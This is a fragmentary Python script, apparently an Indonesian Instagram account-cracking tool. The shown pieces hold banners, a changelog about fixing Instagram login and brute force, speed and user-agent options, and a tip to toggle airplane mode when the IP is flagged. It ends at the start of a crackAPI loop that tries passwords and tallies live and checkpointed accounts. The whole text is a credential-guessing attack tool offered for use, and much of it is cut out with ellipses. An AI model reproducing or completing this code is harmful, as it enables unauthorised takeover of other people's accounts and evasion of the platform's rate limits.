...
║██████║█████████║
 ...
 [{U}>{C}] DANZZ Admin Ganteng Banget
	...
	def ChangeLog(self):
		print(f"""
 [{U}>{C}] Fitur yang di update:
   -Fix bug login instagram
 ...
 [{U}>{C}] Fix bug:
   -Untuk fitur brute force masih dalam perbaikan
 ...
 1{U}}}{C} SANGAT CEPAT  [HASIL DIKIT]
 2{U}}}{C} AGAK CEPAT  [HASIL LUMAYAN]
 3{U}}}{C} CEPAT  [HASIL BANYAK ]
		""")
 ...
 {U}[{C}2{U}]{C} USER-AGENT 2 [DI REKOMENDASIKAN]
 ...
 [{M}!{C}] Jika alamat IP terkena spam hidupkan mode pesawat selama 5 detik
		""")
	...
	def crackAPI(self,user,pas,uaAPI):
		...
		sys.stdout.write(f"\r [🤠][{K}{loop}/{len(internal)}{C}] {H}[LIVE :{len(success)}]{C}  {M}[FUCK :{len(checkpoint)}]{C} "),
		sys.stdout.flush()
		try:
			for pw in pas:
